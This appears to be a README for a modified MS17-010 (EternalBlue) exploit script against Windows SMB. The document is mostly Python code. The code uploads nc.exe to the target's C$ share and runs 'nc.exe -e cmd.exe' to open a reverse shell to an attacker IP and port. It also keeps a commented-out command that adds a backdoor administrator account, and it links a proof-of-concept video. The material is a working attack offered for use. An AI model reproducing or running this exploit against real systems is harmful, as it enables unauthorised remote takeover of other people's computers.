# MS-17-010_Reverse_Connection_nc
#### Run MS17-010 modified exploit to get reverse nc connection

Modified Code
Change LHOST and LPORT. This is your IP address and port where you are listening.
nc.exe is in same folder where your script.


def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()	
	#print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	#fid2 = smbConn.createFile(tid2, '/pwned.txt')
	#smbConn.closeFile(tid2, fid2)
	#smbConn.disconnectTree(tid2)	
	#smb_send_file(smbConn, 'Full path of nc in local', 'C', '/nc.exe')
	smb_send_file(smbConn, 'nc.exe', 'C', '/nc.exe')
	#service_exec(conn, r'cmd /c net user temp temp123 /add && net localgroup administrators temp /add')
	print "check your nc...for reverse connection...."
	#service_exec(conn, r'cmd /c c:\\nc.exe -e cmd.exe LHOST LPORT')
	service_exec(conn, r'cmd /c c:\\nc.exe -e cmd.exe 10.11.0.152 3333')
	smbConn.disconnectTree(tid2)
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
	with open(localSrc, 'rb') as fp:
		smbConn.putFile(remoteDrive + '$', remotePath, fp.read)


POC: https://giant.gfycat.com/HappygoluckyEdibleHummingbird.webm

![Alt Text](https://giant.gfycat.com/HappygoluckyEdibleHummingbird.gif)
